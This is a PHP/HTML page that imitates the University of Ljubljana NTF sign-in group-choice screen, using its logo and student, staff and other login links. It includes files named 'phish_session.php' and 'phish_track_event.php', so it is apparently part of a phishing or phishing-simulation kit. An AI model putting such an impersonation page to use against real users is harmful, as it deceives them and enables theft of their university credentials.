<?php
require __DIR__ . '/phish_session.php';
$pageSlug = 'choice';
require __DIR__ . '/phish_track_event.php';
?>

<!doctype html>
<html lang="sl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Prijavite se v spletno mesto | NTF</title>
  <link rel="stylesheet" href="/style.css?v=1">
  <link rel="apple-touch-icon" sizes="180x180" href="MEDIA/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="MEDIA/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="MEDIA/favicon-16x16.png">
  <link rel="manifest" href="MEDIA/site.webmanifest">
</head>
<body>

      <div class="choice-wrap">
    <header class="choice-header">
      <img class="unlogo" src="MEDIA/unilj_logo.svg" alt="Univerza v Ljubljani">
    </header>

    <main class="choice-main">
      <h1 class="choice-title">
        Za vstop izberite ustrezno skupino in se prijavite.
      </h1>

      <nav class="choice-list">
        <a href="/login?group=student" class="choice-btn">
          <span class="choice-label">
            Študenti<span class="choice-label-en">/Students</span>
          </span>
          <span class="choice-arrow">›</span>
        </a>

        <a href="/login?group=staff" class="choice-btn">
          <span class="choice-label">
            Zaposleni<span class="choice-label-en">/NTF staff</span>
          </span>
          <span class="choice-arrow">›</span>
        </a>

        <a href="/login?group=other" class="choice-btn">
          <span class="choice-label">
            Ostali<span class="choice-label-en">/Others</span>
          </span>
          <span class="choice-arrow">›</span>
        </a>
      </nav>

        <footer class="choice-footer">
         <div class="login-footer-links">
        <a href="#">Terms of use</a>
        <a href="#">Phising  & cookies</a>
      </div>
      <div class="login-footer-more">…</div>
    </footer>
    </main>
  </div>

</body>
</html>
